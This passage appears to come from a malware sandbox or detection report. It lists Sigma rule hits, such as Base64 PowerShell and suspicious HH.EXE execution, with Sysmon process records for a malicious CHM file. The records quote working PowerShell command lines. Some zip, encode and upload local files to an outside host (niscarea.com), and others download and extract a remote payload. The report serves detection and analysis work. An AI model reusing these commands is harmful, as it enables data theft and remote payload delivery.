                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C6B-6553-4C06-000000004800}; ProcessId=7372; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\tsklt.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978347; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e75e9983c2277304aa1294c0b077a3139a8405cd1661ccf513a6c05a002acacf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Base64 Encoded PowerShell Command Detected",
                                                                       "rule_description":  "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C9F-6553-5C06-000000004800}; ProcessId=7284; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\alo293n20so.zip\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/out.php?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u);if ($r.Length -gt 32){Remove-Item $f -Force;$b=[Convert]::FromBase64String($r);[System.IO.File]::WriteAllBytes($f,$b);$h=[System.IO.Compression.ZipFile]::OpenRead($f);foreach ($e in $h.Entries){\t[System.IO.Compression.ZipFileExtensions]::ExtractToFile($e,$e.FullName,$true);}$h.Dispose();Remove-Item $f -Force;}\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978399; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CA4-6553-5D06-000000004800}; ProcessId=6544; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\alo293n20so.zip\u0027;$c=[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$u=$l+\u0027/out.php?cn=\u0027+$c;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$r=$w.DownloadString($u);if ($r.Length -gt 32){Remove-Item $f -Force;$b=[Convert]::FromBase64String($r);[System.IO.File]::WriteAllBytes($f,$b);$h=[System.IO.Compression.ZipFile]::OpenRead($f);foreach ($e in $h.Entries){\t[System.IO.Compression.ZipFileExtensions]::ExtractToFile($e,$e.FullName,$true);}$h.Dispose();Remove-Item $f -Force;}\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978404; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "f011f2d580ad7a21cd2da8b72d5734b707147be0ec1270fb20fc1aa455fd4d89",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious HH.EXE Execution",
                                                                       "rule_description":  "Detects a suspicious execution of a Microsoft HTML Help (HH.exe)",
                                                                       "rule_author":  "Maxim Pavlunin",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C51-6553-2D06-000000004800}; ProcessId=7176; Product=HTML Help; Description=Microsoft\\xae HTML Help Executable; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C4F-6553-2B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=A50C9DF7603E2F1AEA6B54053794A326,SHA256=308B97761A8B59409EEBA0ED4CE1C24F6B3C81801358296F19E607348C5AA8CB,IMPHASH=D3D9C3E81A404E7F5C5302429636F04C; OriginalFileName=HH.exe; ParentImage=C:\\Windows\\hh.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5420; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\hh.exe\" -decompile C:\\Users\\Public\\Libraries C:\\Users\\george\\Desktop\\[HF].chm; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\hh.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\hh.exe\" C:\\Users\\george\\Desktop\\[HF].chm; UtcTime=1699978321; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{CommandLine=\"C:\\Windows\\hh.exe\" -decompile C:\\Users\\Public\\Libraries C:\\Users\\RDHJ0C~1\\Desktop\\HF.chm; Image=C:\\Windows\\hh.exe; EventID=1}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "06b48fa7870d38bdf92b4d4a9b9c4a4df779bd405fdc5ba0e70911df20027ce1",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Change PowerShell Policies to an Insecure Level",
                                                                       "rule_description":  "Detects use of executionpolicy option to set insecure policies",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C61-6553-4506-000000004800}; ProcessId=8088; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\sys.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978337; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C64-6553-4806-000000004800}; ProcessId=4728; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\sys.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978340; RuleName=-}"
                                                                                             },
